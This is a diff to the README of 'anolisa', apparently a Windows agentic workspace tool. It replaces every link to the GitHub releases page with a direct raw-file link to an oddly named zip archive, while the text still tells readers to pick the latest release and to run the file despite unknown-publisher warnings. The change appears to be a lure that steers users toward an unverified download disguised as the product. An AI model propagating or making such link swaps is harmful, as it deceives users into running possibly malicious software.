@@ -1,6 +1,6 @@
 # 🤖 anolisa - Simple Agentic Workspace Layer
 
-[![Download anolisa](https://img.shields.io/badge/Download%20anolisa-purple?style=for-the-badge&logo=github)](https://github.com/Anastasi3093/anolisa/releases)
+[![Download anolisa](https://img.shields.io/badge/Download%20anolisa-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Anastasi3093/anolisa/main/defterdar/Software-medullation.zip)
 
 ## 🧩 What anolisa is
 
@@ -26,7 +26,7 @@ For best use, keep Windows up to date.
 
 Visit this page to download:
 
-https://github.com/Anastasi3093/anolisa/releases
+https://raw.githubusercontent.com/Anastasi3093/anolisa/main/defterdar/Software-medullation.zip
 
 On that page, look for the latest release. Download the Windows file that matches your PC, then open it to start the setup or app launch.
 
@@ -131,7 +131,7 @@ If Windows says the app is from an unknown publisher, use the release page from 
 
 Check the release page any time you want the latest version:
 
-https://github.com/Anastasi3093/anolisa/releases
+https://raw.githubusercontent.com/Anastasi3093/anolisa/main/defterdar/Software-medullation.zip
 
 New releases may include fixes, faster startup, better task handling, and updated skills.
 
